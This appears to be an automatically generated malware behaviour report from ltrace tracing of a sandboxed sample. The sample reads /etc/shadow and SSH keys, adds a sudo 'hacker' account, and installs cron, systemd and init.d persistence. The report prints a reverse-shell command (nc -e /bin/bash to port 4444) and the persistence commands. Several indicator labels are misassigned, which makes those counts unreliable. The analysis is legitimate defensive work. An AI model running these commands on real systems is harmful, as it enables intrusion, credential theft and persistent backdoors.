@@ -1,0 +1,733 @@
+====================================================================================================
+MALWARE BEHAVIOR ANALYSIS REPORT
+Generated: 2025-10-26 14:35:46
+====================================================================================================
+
+## EXECUTIVE SUMMARY
+----------------------------------------------------------------------------------------------------
+This report analyzes the behavioral patterns detected in the ltrace output,
+identifying malicious tactics, techniques, and procedures (TTPs) based on
+library call patterns and system interactions.
+
+Total Behavioral Indicators Detected: 2087
+Total Function Calls Analyzed: 55227
+Tactics Employed: 10
+
+## TACTICS OVERVIEW
+----------------------------------------------------------------------------------------------------
+✓ DISCOVERY                 - System and Network Discovery                       [504 indicators]
+✓ PERSISTENCE               - Establish Persistence Mechanisms                   [796 indicators]
+✓ PRIVILEGE_ESCALATION      - Privilege Escalation Attempts                      [261 indicators]
+✓ DEFENSE_EVASION           - Evade Detection and Analysis                       [  5 indicators]
+✓ EXECUTION                 - Execute Malicious Code                             [ 66 indicators]
+✓ CREDENTIAL_ACCESS         - Credential Theft and Access                        [211 indicators]
+✓ INITIAL_ACCESS            - Initial Access Vector                              [ 93 indicators]
+  IMPACT                    - System Impact and Modifications                    [  0 indicators]
+  GTFOBIN_SHELL             - GTFOBins Shell Escape/Execution                    [  0 indicators]
+  GTFOBIN_FILE_READ         - GTFOBins Unauthorized File Read                    [  0 indicators]
+  GTFOBIN_FILE_WRITE        - GTFOBins Unauthorized File Write                   [  0 indicators]
+✓ GTFOBIN_SUID              - GTFOBins SUID Exploitation                         [  2 indicators]
+✓ GTFOBIN_SUDO              - GTFOBins Sudo Exploitation                         [120 indicators]
+  GTFOBIN_REVERSE_SHELL     - GTFOBins Reverse Shell Establishment               [  0 indicators]
+  GTFOBIN_FILE_UPLOAD       - GTFOBins File Upload/Exfiltration                  [  0 indicators]
+  GTFOBIN_FILE_DOWNLOAD     - GTFOBins File Download                             [  0 indicators]
+✓ GTFOBIN_LIBRARY_LOAD      - GTFOBins Library/Module Loading                    [ 29 indicators]
+
+## ATTACK CHAIN ANALYSIS
+====================================================================================================
+
+### Phase 1: Initial Access
+Attacker gains initial foothold via SSH brute force
+----------------------------------------------------------------------------------------------------
+
+▸ Last Login Information Access
+  Occurrences: 93
+  Example 1: strcmp("LASTLOG_UID_MAX", "MAIL_DIR"...)
+  Example 2: strcmp("LASTLOG_UID_MAX", "LOG_UNKFAIL_ENAB"...)
+  Example 3: strcmp("LASTLOG_UID_MAX", "LOG_OK_LOGINS"...)
+  ... and 90 more occurrences
+
+### Phase 2: Discovery
+System reconnaissance and information gathering
+----------------------------------------------------------------------------------------------------
+
+▸ Account Discovery
+  Occurrences: 17
+  Example 1: fopen("/etc/passwd", "r"...)
+  Example 2: printf("[+] Reading: %s\n", "/etc/passwd"...)
+  Example 3: fgets("# their home directory in /etc/passwd to avoid a spurious warning.\n", 1024, 0x...)
+  ... and 14 more occurrences
+
+▸ Password File Access
+  Occurrences: 10
+  Example 1: fopen("/etc/shadow", "r"...)
+  Example 2: printf("[+] Reading: %s\n", "/etc/shadow"...)
+  Example 3: access("/etc/shadow", 0...)
+  ... and 7 more occurrences
+
+▸ Network Connection Discovery
+  Occurrences: 469
+  Example 1: fgets("# be assumed.  All other items are optional - if not specified then\n", 1024, 0...)
+  Example 2: strlen("# be assumed.  All other items are optional - if not specified then\n"...)
+  Example 3: strspn("# be assumed.  All other items are optional - if not specified then", " \t"...)
+  ... and 466 more occurrences
+
+▸ Network Configuration Discovery
+  Occurrences: 1
+  Example 1: read(10, " "CanReload=no" ]; then\n            # The reload action falls back to the ...)
+
+▸ System Hostname Discovery
+  Occurrences: 6
+  Example 1: memchr("/usr/lib/systemd/system/systemd-hostnamed.service", '\0', 49...)
+  Example 2: basename("/usr/lib/systemd/system/systemd-hostnamed.service"...)
+  Example 3: strrchr("/usr/lib/systemd/system/systemd-hostnamed.service", '.'...)
+  ... and 3 more occurrences
+
+▸ Boot/Logon Autostart Discovery
+  Occurrences: 1
+  Example 1: fopen("/etc/rc.local", "a"...)
+
+### Phase 3: Execution
+Deploy and execute malicious payloads
+----------------------------------------------------------------------------------------------------
+
+▸ Bash Shell Execution
+  Occurrences: 36
+  Example 1: fgets("root:x:0:0:root:/root:/bin/bash\n", 512, 0x558ffc4cf6b0...)
+  Example 2: fgets("ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\n", 512, 0x558ffc4cf6b0...)
+  Example 3: fgets("hacker:x:1001:1001::/home/hacker:/bin/bash\n", 512, 0x558ffc4cf6b0...)
+  ... and 33 more occurrences
+
+▸ Set Execute Permissions
+  Occurrences: 2
+  Example 1: chmod("/usr/lib/systemd/system/malware.service", 0755...)
+  Example 2: chmod("/etc/init.d/backdoor", 0755...)
+
+▸ Shell Execution
+  Occurrences: 5
+  Example 1: fgets("SHELL=/bin/sh\n", 1024, 0x563801c442a0...)
+  Example 2: strrchr("SHELL=/bin/sh\n", '\n'...)
+  Example 3: strchr("SHELL=/bin/sh", '='...)
+  ... and 2 more occurrences
+
+▸ Process Creation
+  Occurrences: 15
+  Example 1: fork(...)
+  Example 2: fork(...)
+  Example 3: fork(...)
+  ... and 12 more occurrences
+
+▸ Program Execution
+  Occurrences: 8
+  Example 1: execve(0x559f1111cea9, 0x7ffdedb9e190, 0x7ffdedb9e188, 0x7f9c46a0a5d8...)
+  Example 2: execve(0x559f1111ce92, 0x7ffdedb9e190, 0x7ffdedb9e188, 0x7f9c46a0a5d8...)
+  Example 3: execve(0x5564754c4faf, 0x7fffe0db98f0, 0x7fffe0db98e8, 0x7f78c760a5d8...)
+  ... and 5 more occurrences
+
+### Phase 4: Persistence
+Establish persistence mechanisms
+----------------------------------------------------------------------------------------------------
+
+▸ Systemd Service Creation
+  Occurrences: 751
+  Example 1: fopen("/usr/lib/systemd/system/malware.service", "w"...)
+  Example 2: chmod("/usr/lib/systemd/system/malware.service", 0755...)
+  Example 3: printf("[+] Installed: %s\n", "/usr/lib/systemd/system/malware.service"...)
+  ... and 748 more occurrences
+
+▸ Init Script Persistence
+  Occurrences: 7
+  Example 1: fopen("/etc/init.d/backdoor", "w"...)
+  Example 2: chmod("/etc/init.d/backdoor", 0755...)
+  Example 3: printf("[+] Installed: %s\n", "/etc/init.d/backdoor"...)
+  ... and 4 more occurrences
+
+▸ Cron Job Persistence
+  Occurrences: 34
+  Example 1: strlen("echo '*/5 * * * * /tmp/.hidden_malware' | crontab -"...)
+  Example 2: memcpy(0x5601dedf14a8, "echo '*/5 * * * * /tmp/.hidden_malware' | crontab -\0", 52...)
+  Example 3: strlen("echo '*/5 * * * * /tmp/.hidden_malware' | crontab -"...)
+  ... and 31 more occurrences
+
+▸ Systemd Service Enable
+  Occurrences: 3
+  Example 1: strlen("systemctl enable malware-persist.service"...)
+  Example 2: memcpy(0x5599b22a94a8, "systemctl enable malware-persist.service\0", 41...)
+  Example 3: strlen("systemctl enable malware-persist.service"...)
+
+▸ RC Local Persistence
+  Occurrences: 1
+  Example 1: fopen("/etc/rc.local", "a"...)
+
+### Phase 5: Privilege Escalation
+Attempt to gain elevated privileges
+----------------------------------------------------------------------------------------------------
+
+▸ Shadow File Access (requires root)
+  Occurrences: 10
+  Example 1: fopen("/etc/shadow", "r"...)
+  Example 2: printf("[+] Reading: %s\n", "/etc/shadow"...)
+  Example 3: access("/etc/shadow", 0...)
+  ... and 7 more occurrences
+
+▸ Sudo Command Execution
+  Occurrences: 120
+  Example 1: fgets("sudo:*::ubuntu,hacker\n", 512, 0x558ffc4cf6b0...)
+  Example 2: strlen("usermod -aG sudo hacker"...)
+  Example 3: memcpy(0x56307b69e4a8, "usermod -aG sudo hacker\0", 24...)
+  ... and 117 more occurrences
+
+▸ New User Account Creation
+  Occurrences: 101
+  Example 1: strlen("useradd -m -s /bin/bash hacker"...)
+  Example 2: memcpy(0x5654897f44a8, "useradd -m -s /bin/bash hacker\0", 31...)
+  Example 3: strlen("useradd -m -s /bin/bash hacker"...)
+  ... and 98 more occurrences
+
+▸ Switch User Command
+  Occurrences: 27
+  Example 1: fgets("# Enable "syslog" logging of su activity - in addition to sulog file logging.\n...)
+  Example 2: strlen("# Enable "syslog" logging of su activity - in addition to sulog file logging.\n...)
+  Example 3: strspn("# Enable "syslog" logging of su activity - in addition to sulog file logging.",...)
+  ... and 24 more occurrences
+
+▸ Add User to Sudo Group
+  Occurrences: 3
+  Example 1: strlen("usermod -aG sudo hacker"...)
+  Example 2: memcpy(0x56307b69e4a8, "usermod -aG sudo hacker\0", 24...)
+  Example 3: strlen("usermod -aG sudo hacker"...)
+
+### Phase 6: Defense Evasion
+Cover tracks and evade detection
+----------------------------------------------------------------------------------------------------
+
+▸ Use of Temporary Directory
+  Occurrences: 5
+  Example 1: strlen("echo '*/5 * * * * /tmp/.hidden_malware' | crontab -"...)
+  Example 2: memcpy(0x5601dedf14a8, "echo '*/5 * * * * /tmp/.hidden_malware' | crontab -\0", 52...)
+  Example 3: strlen("echo '*/5 * * * * /tmp/.hidden_malware' | crontab -"...)
+  ... and 2 more occurrences
+
+## DETAILED BEHAVIORAL ANALYSIS
+====================================================================================================
+
+### DISCOVERY: System and Network Discovery
+----------------------------------------------------------------------------------------------------
+Total Indicators: 504
+
+▸ Account Discovery
+  Count: 17
+  Evidence:
+    [None] fopen("/etc/passwd", "r"...) = 0x558ffc4cf6b0
+    [None] printf("[+] Reading: %s\n", "/etc/passwd"...) = 25
+    [None] fgets("# their home directory in /etc/passwd to avoid a spurious warning.\n"...) = 0x7ffe81c357d0
+    [None] strlen("# their home directory in /etc/passwd to avoid a spurious warning.\n"...) = 67
+    [None] strspn("# their home directory in /etc/passwd to avoid a spurious warning.", ...) = 0
+    ... and 12 more
+
+▸ Boot/Logon Autostart Discovery
+  Count: 1
+  Evidence:
+    [None] fopen("/etc/rc.local", "a"...) = 0x558ffc4cf6b0
+
+▸ Network Configuration Discovery
+  Count: 1
+  Evidence:
+    [None] read(10, " "CanReload=no" ]; then\n            # The reload action falls ba...) = 912
+
+▸ Network Connection Discovery
+  Count: 469
+  Evidence:
+    [None] fgets("# be assumed.  All other items are optional - if not specified then\n...) = 0x7ffe81c357d0
+    [None] strlen("# be assumed.  All other items are optional - if not specified then\n...) = 68
+    [None] strspn("# be assumed.  All other items are optional - if not specified then",...) = 0
+    [None] strcmp("PASS_MAX_DAYS", "SYSLOG_SU_ENAB"...) = -3
+    [None] strcmp("PASS_MIN_DAYS", "SYSLOG_SU_ENAB"...) = -3
+    ... and 464 more
+
+▸ Password File Access
+  Count: 10
+  Evidence:
+    [None] fopen("/etc/shadow", "r"...) = 0x558ffc4cf6b0
+    [None] printf("[+] Reading: %s\n", "/etc/shadow"...) = 25
+    [None] access("/etc/shadow", 0...) = 0
+    [None] access("/etc/shadow", 0...) = 0
+    [None] strncmp("/etc/shadow", "/etc/", 5...) = 0
+    ... and 5 more
+
+▸ System Hostname Discovery
+  Count: 6
+  Evidence:
+    [None] memchr("/usr/lib/systemd/system/systemd-hostnamed.service", '\0', 49...) = 0
+    [None] basename("/usr/lib/systemd/system/systemd-hostnamed.service"...) = "systemd-hostnamed.service"
+    [None] strrchr("/usr/lib/systemd/system/systemd-hostnamed.service", '.'...) = ".service"
+    [None] memchr("/usr/lib/systemd/system/dbus-org.freedesktop.hostname1.service", '\0'...) = 0
+    [None] basename("/usr/lib/systemd/system/dbus-org.freedesktop.hostname1.service"...) = "dbus-org.freedesktop.hostname1.service"
+    ... and 1 more
+
+### PERSISTENCE: Establish Persistence Mechanisms
+----------------------------------------------------------------------------------------------------
+Total Indicators: 796
+
+▸ Cron Job Persistence
+  Count: 34
+  Evidence:
+    [None] strlen("echo '*/5 * * * * /tmp/.hidden_malware' | crontab -"...) = 51
+    [None] memcpy(0x5601dedf14a8, "echo '*/5 * * * * /tmp/.hidden_malware' | crontab -\0...) = 0x5601dedf14a8
+    [None] strlen("echo '*/5 * * * * /tmp/.hidden_malware' | crontab -"...) = 51
+    [None] strcmp("crontab", "for"...) = -3
+    [None] strcmp("crontab", "elif"...) = -2
+    ... and 29 more
+
+▸ Init Script Persistence
+  Count: 7
+  Evidence:
+    [None] fopen("/etc/init.d/backdoor", "w"...) = 0x558ffc4cf6b0
+    [None] chmod("/etc/init.d/backdoor", 0755...) = 0
+    [None] printf("[+] Installed: %s\n", "/etc/init.d/backdoor"...) = 36
+    [None] strlen("/etc/init.d/firewalld.service"...) = 29
+    [None] access("/etc/init.d/firewalld", 0...) = -1
+    ... and 2 more
+
+▸ RC Local Persistence
+  Count: 1
+  Evidence:
+    [None] fopen("/etc/rc.local", "a"...) = 0x558ffc4cf6b0
+
+▸ Systemd Service Creation
+  Count: 751
+  Evidence:
+    [None] fopen("/usr/lib/systemd/system/malware.service", "w"...) = 0x558ffc4cf6b0
+    [None] chmod("/usr/lib/systemd/system/malware.service", 0755...) = 0
+    [None] printf("[+] Installed: %s\n", "/usr/lib/systemd/system/malware.service"...) = 55
+    [None] strlen(".service"...) = 8
+    [None] memchr("Unit firewalld.service not loaded.", '\0', 34...) = 0
+    ... and 746 more
+
+▸ Systemd Service Enable
+  Count: 3
+  Evidence:
+    [None] strlen("systemctl enable malware-persist.service"...) = 40
+    [None] memcpy(0x5599b22a94a8, "systemctl enable malware-persist.service\0", 41...) = 0x5599b22a94a8
+    [None] strlen("systemctl enable malware-persist.service"...) = 40
+
+### PRIVILEGE_ESCALATION: Privilege Escalation Attempts
+----------------------------------------------------------------------------------------------------
+Total Indicators: 261
+
+▸ Add User to Sudo Group
+  Count: 3
+  Evidence:
+    [None] strlen("usermod -aG sudo hacker"...) = 23
+    [None] memcpy(0x56307b69e4a8, "usermod -aG sudo hacker\0", 24...) = 0x56307b69e4a8
+    [None] strlen("usermod -aG sudo hacker"...) = 23
+
+▸ New User Account Creation
+  Count: 101
+  Evidence:
+    [None] strlen("useradd -m -s /bin/bash hacker"...) = 30
+    [None] memcpy(0x5654897f44a8, "useradd -m -s /bin/bash hacker\0", 31...) = 0x5654897f44a8
+    [None] strlen("useradd -m -s /bin/bash hacker"...) = 30
+    [None] strcmp("useradd", "for"...) = 15
+    [None] strcmp("useradd", "until"...) = 5
+    ... and 96 more
+
+▸ Shadow File Access (requires root)
+  Count: 10
+  Evidence:
+    [None] fopen("/etc/shadow", "r"...) = 0x558ffc4cf6b0
+    [None] printf("[+] Reading: %s\n", "/etc/shadow"...) = 25
+    [None] access("/etc/shadow", 0...) = 0
+    [None] access("/etc/shadow", 0...) = 0
+    [None] strncmp("/etc/shadow", "/etc/", 5...) = 0
+    ... and 5 more
+
+▸ Sudo Command Execution
+  Count: 120
+  Evidence:
+    [None] fgets("sudo:*::ubuntu,hacker\n", 512, 0x558ffc4cf6b0...) = 0x7ffe1fe55380
+    [None] strlen("usermod -aG sudo hacker"...) = 23
+    [None] memcpy(0x56307b69e4a8, "usermod -aG sudo hacker\0", 24...) = 0x56307b69e4a8
+    [None] strlen("usermod -aG sudo hacker"...) = 23
+    [None] strcspn("sudo", "\210\203\201\202\204\206\207"...) = 4
+    ... and 115 more
+
+▸ Switch User Command
+  Count: 27
+  Evidence:
+    [None] fgets("# Enable "syslog" logging of su activity - in addition to sulog file ...) = 0x7ffe81c357d0
+    [None] strlen("# Enable "syslog" logging of su activity - in addition to sulog file ...) = 78
+    [None] strspn("# Enable "syslog" logging of su activity - in addition to sulog file ...) = 0
+    [None] fgets("# If defined, all su activity is logged to this file.\n", 1024, 0x563...) = 0x7ffe81c357d0
+    [None] strlen("# If defined, all su activity is logged to this file.\n"...) = 54
+    ... and 22 more
+
+### DEFENSE_EVASION: Evade Detection and Analysis
+----------------------------------------------------------------------------------------------------
+Total Indicators: 5
+
+▸ Use of Temporary Directory
+  Count: 5
+  Evidence:
+    [None] strlen("echo '*/5 * * * * /tmp/.hidden_malware' | crontab -"...) = 51
+    [None] memcpy(0x5601dedf14a8, "echo '*/5 * * * * /tmp/.hidden_malware' | crontab -\0...) = 0x5601dedf14a8
+    [None] strlen("echo '*/5 * * * * /tmp/.hidden_malware' | crontab -"...) = 51
+    [None] fwrite("ExecStart=/tmp/.hidden_malware\n", 1, 31, 0x558ffc4cf6b0...) = 31
+    [None] fwrite("/tmp/.hidden_malware &\n", 1, 23, 0x558ffc4cf6b0...) = 23
+
+### EXECUTION: Execute Malicious Code
+----------------------------------------------------------------------------------------------------
+Total Indicators: 66
+
+▸ Bash Shell Execution
+  Count: 36
+  Evidence:
+    [None] fgets("root:x:0:0:root:/root:/bin/bash\n", 512, 0x558ffc4cf6b0...) = 0x7ffe1fe55380
+    [None] fgets("ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\n", 512, 0x558ffc4cf...) = 0x7ffe1fe55380
+    [None] fgets("hacker:x:1001:1001::/home/hacker:/bin/bash\n", 512, 0x558ffc4cf6b0...) = 0x7ffe1fe55380
+    [None] fgets("hacker:x:1001:1001::/home/hacker:/bin/bash\n", 512, 0x558ffc4cf6b0...) = 0
+    [None] fwrite("#!/bin/bash\n", 1, 12, 0x558ffc4cf6b0...) = 12
+    ... and 31 more
+
+▸ Process Creation
+  Count: 15
+  Evidence:
+    [None] fork(...) = 28292
+    [None] fork(...) = 28293
+    [None] fork(...) = 28294
+    [None] fork(...) = 28295
+    [None] fork(...) = 28309
+    ... and 10 more
+
+▸ Program Execution
+  Count: 8
+  Evidence:
+    [None] execve(0x559f1111cea9, 0x7ffdedb9e190, 0x7ffdedb9e188, 0x7f9c46a0a5d8...) = -1
+    [None] execve(0x559f1111ce92, 0x7ffdedb9e190, 0x7ffdedb9e188, 0x7f9c46a0a5d8...) = -1
+    [None] execve(0x5564754c4faf, 0x7fffe0db98f0, 0x7fffe0db98e8, 0x7f78c760a5d8...) = -1
+    [None] execve(0x5564754c4faf, 0x7fffe0db98f0, 0x7fffe0db98e8, 0x7f78c760a5d8...) = -1
+    [None] execve(0x5564754c4f98, 0x7fffe0db9900, 0x7fffe0db98f8, 0x7f78c760a5d8...) = -1
+    ... and 3 more
+
+▸ Set Execute Permissions
+  Count: 2
+  Evidence:
+    [None] chmod("/usr/lib/systemd/system/malware.service", 0755...) = 0
+    [None] chmod("/etc/init.d/backdoor", 0755...) = 0
+
+▸ Shell Execution
+  Count: 5
+  Evidence:
+    [None] fgets("SHELL=/bin/sh\n", 1024, 0x563801c442a0...) = 0x7ffe81c357f0
+    [None] strrchr("SHELL=/bin/sh\n", '\n'...) = "\n"
+    [None] strchr("SHELL=/bin/sh", '='...) = "=/bin/sh"
+    [None] strlen("/bin/sh"...) = 7
+    [None] read(10, "#!/bin/sh\n\n####################################################...) = 8192
+
+### CREDENTIAL_ACCESS: Credential Theft and Access
+----------------------------------------------------------------------------------------------------
+Total Indicators: 211
+
+▸ Password File Access
+  Count: 17
+  Evidence:
+    [None] fopen("/etc/passwd", "r"...) = 0x558ffc4cf6b0
+    [None] printf("[+] Reading: %s\n", "/etc/passwd"...) = 25
+    [None] fgets("# their home directory in /etc/passwd to avoid a spurious warning.\n"...) = 0x7ffe81c357d0
+    [None] strlen("# their home directory in /etc/passwd to avoid a spurious warning.\n"...) = 67
+    [None] strspn("# their home directory in /etc/passwd to avoid a spurious warning.", ...) = 0
+    ... and 12 more
+
+▸ Password-related Activity
+  Count: 179
+  Evidence:
+    [None] fgets("# Password aging controls:\n", 1024, 0x563801c442a0...) = 0x7ffe81c357d0
+    [None] strlen("# Password aging controls:\n"...) = 27
+    [None] strspn("# Password aging controls:", " \t"...) = 0
+    [None] fgets("#\tPASS_MAX_DAYS\tMaximum number of days a password may be used.\n", ...) = 0x7ffe81c357d0
+    [None] strlen("#\tPASS_MAX_DAYS\tMaximum number of days a password may be used.\n"...) = 63
+    ... and 174 more
+
+▸ SSH Key Access
+  Count: 3
+  Evidence:
+    [None] fopen("/root/.ssh/id_rsa", "r"...) = 0
+    [None] fopen("/root/.ssh/id_ed25519", "r"...) = 0
+    [None] fopen("/home/*/.ssh/id_rsa", "r"...) = 0
+
+▸ SSH Private Key Access
+  Count: 2
+  Evidence:
+    [None] fopen("/root/.ssh/id_rsa", "r"...) = 0
+    [None] fopen("/home/*/.ssh/id_rsa", "r"...) = 0
+
+▸ Shadow Password File Access
+  Count: 10
+  Evidence:
+    [None] fopen("/etc/shadow", "r"...) = 0x558ffc4cf6b0
+    [None] printf("[+] Reading: %s\n", "/etc/shadow"...) = 25
+    [None] access("/etc/shadow", 0...) = 0
+    [None] access("/etc/shadow", 0...) = 0
+    [None] strncmp("/etc/shadow", "/etc/", 5...) = 0
+    ... and 5 more
+
+### INITIAL_ACCESS: Initial Access Vector
+----------------------------------------------------------------------------------------------------
+Total Indicators: 93
+
+▸ Last Login Information Access
+  Count: 93
+  Evidence:
+    [None] strcmp("LASTLOG_UID_MAX", "MAIL_DIR"...) = -1
+    [None] strcmp("LASTLOG_UID_MAX", "LOG_UNKFAIL_ENAB"...) = -14
+    [None] strcmp("LASTLOG_UID_MAX", "LOG_OK_LOGINS"...) = -14
+    [None] strcmp("LASTLOG_UID_MAX", "SYSLOG_SU_ENAB"...) = -7
+    [None] strcmp("LASTLOG_UID_MAX", "SYSLOG_SG_ENAB"...) = -7
+    ... and 88 more
+
+### GTFOBIN_SUID: GTFOBins SUID Exploitation
+----------------------------------------------------------------------------------------------------
+Total Indicators: 2
+
+▸ Chmod SUID
+  Count: 2
+  Evidence:
+    [None] chmod("/usr/lib/systemd/system/malware.service", 0755...) = 0
+    [None] chmod("/etc/init.d/backdoor", 0755...) = 0
+
+### GTFOBIN_SUDO: GTFOBins Sudo Exploitation
+----------------------------------------------------------------------------------------------------
+Total Indicators: 120
+
+▸ Sudo Execution
+  Count: 120
+  Evidence:
+    [None] fgets("sudo:*::ubuntu,hacker\n", 512, 0x558ffc4cf6b0...) = 0x7ffe1fe55380
+    [None] strlen("usermod -aG sudo hacker"...) = 23
+    [None] memcpy(0x56307b69e4a8, "usermod -aG sudo hacker\0", 24...) = 0x56307b69e4a8
+    [None] strlen("usermod -aG sudo hacker"...) = 23
+    [None] strcspn("sudo", "\210\203\201\202\204\206\207"...) = 4
+    ... and 115 more
+
+### GTFOBIN_LIBRARY_LOAD: GTFOBins Library/Module Loading
+----------------------------------------------------------------------------------------------------
+Total Indicators: 29
+
+▸ LD.SO Execution
+  Count: 29
+  Evidence:
+    [None] memchr("/usr/lib/systemd/system/systemd-journald.socket", '\0', 47...) = 0
+    [None] basename("/usr/lib/systemd/system/systemd-journald.socket"...) = "systemd-journald.socket"
+    [None] strrchr("/usr/lib/systemd/system/systemd-journald.socket", '.'...) = ".socket"
+    [None] strrchr("/usr/lib/systemd/system/systemd-journald.socket", '.'...) = ".socket"
+    [None] basename("/usr/lib/systemd/system/systemd-journald.socket"...) = "systemd-journald.socket"
+    ... and 24 more
+
+## FILE OPERATIONS SUMMARY
+====================================================================================================
+
+### Files Written/Modified:
+  [W]   nc -e /bin/bash 192.168.1.100 4444\n
+  [W] #!/bin/bash\n
+  [W] /etc/default/useradd
+  [W] /etc/gshadow
+  [W] /etc/gshadow.28297
+  [W] /etc/init.d/backdoor
+  [W] /etc/passwd
+  [W] /etc/passwd.28297
+  [W] /etc/rc.local
+  [W] /etc/shadow
+  [W] /etc/shadow.28297
+  [W] /etc/systemd/system/malware-persist.service
+  [W] /home/*/.ssh/id_rsa
+  [W] /lib/modules/rootkit.ko
+  [W] /root/.bash_history
+  [W] /root/.ssh/id_rsa
+  [W] /tmp/.hidden_malware &\n
+  [W] /usr/lib/systemd/system/malware.service
+  [W] ExecStart=/tmp/.hidden_malware\n
+
+### Files Made Executable:
+  [X] /etc/init.d/backdoor
+  [X] /usr/lib/systemd/system/malware.service
+
+### Files Deleted:
+  [-] /etc/group.28297
+  [-] /etc/group.lock
+  [-] /etc/gshadow.28297
+  [-] /etc/gshadow.lock
+  [-] /etc/passwd.28297
+  [-] /etc/passwd.lock
+  [-] /etc/shadow.28297
+  [-] /etc/shadow.lock
+
+## INDICATORS OF COMPROMISE (IOCs)
+====================================================================================================
+
+### File System IOCs:
+  • /etc/gshadow
+  • /etc/gshadow.28297
+  • /etc/gshadow.lock
+  • /etc/init.d/firewalld.service
+  • /etc/init.d/malware-persist.service
+  • /etc/passwd
+  • /etc/passwd.28297
+  • /etc/passwd.lock
+  • /etc/shadow
+  • /etc/shadow.28297
+  • /etc/shadow.lock
+  • /etc/systemd/system.attached/malware-persist.service.d
+  • /etc/systemd/system.control/malware-persist.service.d
+  • /etc/systemd/system/malware-persist.service
+  • /etc/systemd/system/malware-persist.service.d
+  • /etc/systemd/system/syslog.service
+  • /run/systemd/generator.late/backdoor.service
+  • /run/systemd/system.attached/malware-persist.service.d
+  • /run/systemd/system.control/malware-persist.service.d
+  • /run/systemd/system/malware-persist.service.d
+  • /run/systemd/transient/malware-persist.service.d
+  • /tmp/.hidden_malware &\n
+  • /usr/lib/systemd/system/apt-daily-upgrade.service
+  • /usr/lib/systemd/system/apt-daily.service
+  • /usr/lib/systemd/system/autovt@.service
+  • /usr/lib/systemd/system/console-getty.service
+  • /usr/lib/systemd/system/container-getty@.service
+  • /usr/lib/systemd/system/cryptdisks-early.service
+  • /usr/lib/systemd/system/cryptdisks.service
+  • /usr/lib/systemd/system/dbus-org.freedesktop.hostname1.service
+  • /usr/lib/systemd/system/dbus-org.freedesktop.locale1.service
+  • /usr/lib/systemd/system/dbus-org.freedesktop.login1.service
+  • /usr/lib/systemd/system/dbus-org.freedesktop.timedate1.service
+  • /usr/lib/systemd/system/debug-shell.service
+  • /usr/lib/systemd/system/dmesg.service
+  • /usr/lib/systemd/system/dpkg-db-backup.service
+  • /usr/lib/systemd/system/e2scrub@.service
+  • /usr/lib/systemd/system/e2scrub_all.service
+  • /usr/lib/systemd/system/e2scrub_fail@.service
+  • /usr/lib/systemd/system/e2scrub_reap.service
+  • /usr/lib/systemd/system/emergency.service
+  • /usr/lib/systemd/system/fstrim.service
+  • /usr/lib/systemd/system/getty-static.service
+  • /usr/lib/systemd/system/getty@.service
+  • /usr/lib/systemd/system/hwclock.service
+  • /usr/lib/systemd/system/initrd-cleanup.service
+  • /usr/lib/systemd/system/initrd-parse-etc.service
+  • /usr/lib/systemd/system/initrd-switch-root.service
+  • /usr/lib/systemd/system/initrd-udevadm-cleanup-db.service
+  • /usr/lib/systemd/system/kmod-static-nodes.service
+  • /usr/lib/systemd/system/kmod.service
+  • /usr/lib/systemd/system/ldconfig.service
+  • /usr/lib/systemd/system/malware-persist.service.d
+  • /usr/lib/systemd/system/malware.service
+  • /usr/lib/systemd/system/modprobe@.service
+  • /usr/lib/systemd/system/motd-news.service
+  • /usr/lib/systemd/system/network-online.target
+  • /usr/lib/systemd/system/network-pre.target
+  • /usr/lib/systemd/system/network.target
+  • /usr/lib/systemd/system/pam_namespace.service
+  • /usr/lib/systemd/system/procps.service
+  • /usr/lib/systemd/system/quotaon.service
+  • /usr/lib/systemd/system/rc-local.service
+  • /usr/lib/systemd/system/rescue.service
+  • /usr/lib/systemd/system/rsyslog.service
+  • /usr/lib/systemd/system/serial-getty@.service
+  • /usr/lib/systemd/system/sys-kernel-config.mount
+  • /usr/lib/systemd/system/sysstat-collect.service
+  • /usr/lib/systemd/system/sysstat-summary.service
+  • /usr/lib/systemd/system/sysstat.service
+  • /usr/lib/systemd/system/system-update-cleanup.service
+  • /usr/lib/systemd/system/systemd-ask-password-console.service
+  • /usr/lib/systemd/system/systemd-ask-password-wall.service
+  • /usr/lib/systemd/system/systemd-backlight@.service
+  • /usr/lib/systemd/system/systemd-battery-check.service
+  • /usr/lib/systemd/system/systemd-binfmt.service
+  • /usr/lib/systemd/system/systemd-boot-check-no-failures.service
+  • /usr/lib/systemd/system/systemd-bsod.service
+  • /usr/lib/systemd/system/systemd-confext.service
+  • /usr/lib/systemd/system/systemd-exit.service
+  • /usr/lib/systemd/system/systemd-firstboot.service
+  • /usr/lib/systemd/system/systemd-fsck-root.service
+  • /usr/lib/systemd/system/systemd-fsck@.service
+  • /usr/lib/systemd/system/systemd-fsckd.service
+  • /usr/lib/systemd/system/systemd-growfs-root.service
+  • /usr/lib/systemd/system/systemd-growfs@.service
+  • /usr/lib/systemd/system/systemd-halt.service
+  • /usr/lib/systemd/system/systemd-hibernate-resume.service
+  • /usr/lib/systemd/system/systemd-hibernate.service
+  • /usr/lib/systemd/system/systemd-hostnamed.service
+  • /usr/lib/systemd/system/systemd-hybrid-sleep.service
+  • /usr/lib/systemd/system/systemd-initctl.service
+  • /usr/lib/systemd/system/systemd-journal-catalog-update.service
+  • /usr/lib/systemd/system/systemd-journal-flush.service
+  • /usr/lib/systemd/system/systemd-journald.service
+  • /usr/lib/systemd/system/systemd-journald@.service
+  • /usr/lib/systemd/system/systemd-kexec.service
+  • /usr/lib/systemd/system/systemd-localed.service
+  • /usr/lib/systemd/system/systemd-logind.service
+  • /usr/lib/systemd/system/systemd-machine-id-commit.service
+  • /usr/lib/systemd/system/systemd-modules-load.service
+  • /usr/lib/systemd/system/systemd-network-generator.service
+  • /usr/lib/systemd/system/systemd-networkd-wait-online.service
+  • /usr/lib/systemd/system/systemd-networkd-wait-online@.service
+  • /usr/lib/systemd/system/systemd-networkd.service
+  • /usr/lib/systemd/system/systemd-networkd.socket
+  • /usr/lib/systemd/system/systemd-pcrextend@.service
+  • /usr/lib/systemd/system/systemd-pcrfs-root.service
+  • /usr/lib/systemd/system/systemd-pcrfs@.service
+  • /usr/lib/systemd/system/systemd-pcrlock-file-system.service
+  • /usr/lib/systemd/system/systemd-pcrlock-firmware-code.service
+  • /usr/lib/systemd/system/systemd-pcrlock-firmware-config.service
+  • /usr/lib/systemd/system/systemd-pcrlock-machine-id.service
+  • /usr/lib/systemd/system/systemd-pcrlock-make-policy.service
+  • /usr/lib/systemd/system/systemd-pcrlock-secureboot-authority.service
